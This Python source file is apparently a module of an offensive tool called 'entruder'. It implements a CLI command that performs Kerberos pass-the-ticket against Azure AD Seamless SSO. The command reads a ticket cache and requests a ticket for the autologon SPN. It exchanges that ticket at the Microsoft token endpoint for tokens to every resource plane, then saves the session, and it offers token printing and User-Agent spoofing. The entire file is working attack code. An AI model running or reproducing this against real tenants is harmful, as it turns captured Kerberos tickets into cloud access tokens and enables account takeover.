import os

import typer

from entruder.static import RESOURCE_SHORTCUTS
from entruder.utils import (
    acquire_for_resources,
    handle_cli_errors,
    request_json,
    save_session,
    require_tenant,
    resolve_client_id,
    initialize_tenant_cache,
)

from ._shared import login_app, console


@login_app.command("kerberos")
@handle_cli_errors
def login_kerberos(
        tenant:        str = typer.Option(...,  "-t", "--tenant",  help="Tenant ID"),
        client_id: str = typer.Option(...,  "-c", "--client-id", help="Client ID"),
        ccache: str = typer.Option(None,  "-a", "--ccache", help="The Kerberos ticket cache file needed for authentication (By Default will extract the $KRB5CCNAME environment variable)"),
        domain: str = typer.Option(...,  "-d", "--domain",   help="AD domain (e.g. test.local)"),
        resource:  str = typer.Option(None, "-r", "--resource", help="Target resource (Optional, default: all planes)"),
        output_tokens: bool = typer.Option(False, "-o", "--output", help="Output tokens to console (Optional)"),
        user_agent: str = typer.Option(None, "-u", "--user-agent", help="Override the User-Agent header sent during authentication (Optional)"),
):
    """Authenticate using Kerberos ticket via Seamless SSO (pass-the-ticket)"""
    # resolve the ccache and assign it to the KRB5CCNAME env variable
    tenant =  require_tenant(tenant,console)
    client_id = resolve_client_id(client_id)
    if ccache:
        ccache = os.path.realpath(ccache)
        if not os.path.exists(ccache):
            console.print(f"[bold red][-][/] ccache file not found: {ccache}")
            raise typer.Exit(1)
        os.environ["KRB5CCNAME"]=f"FILE:{ccache}"

    from entruder.utils.kerberos import get_kerberos_service_ticket
    spn = f"HTTP/autologon.microsoftazuread-sso.com@{domain.upper()}"
    service_ticket = get_kerberos_service_ticket(spn)

    resources = [resource] if resource else list(RESOURCE_SHORTCUTS.keys())
    headers = {"User-Agent": user_agent} if user_agent else None

    def acquire(plane, res):
        resource_url = RESOURCE_SHORTCUTS.get(res, res)
        return request_json("POST",
                              f"https://login.microsoftonline.com/{tenant}/oauth2/token",
                              data={
                                  "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                                  "client_id":  client_id,
                                  "resource":   resource_url,
                                  "assertion":  service_ticket,
                                  "client_info": 1,
                              },
                              headers=headers)


    tokens = acquire_for_resources(resources, acquire, console, output_tokens=output_tokens)

    if tokens:
        save_session(tenant, client_id, tokens)
        initialize_tenant_cache(tenant, client_id)
        console.print(f"\n[bold green][+][/] Session saved for tenant: {tenant}")

    else:
        console.print(f"\n[bold red][-][/] No tokens acquired")
        raise typer.Exit(1)
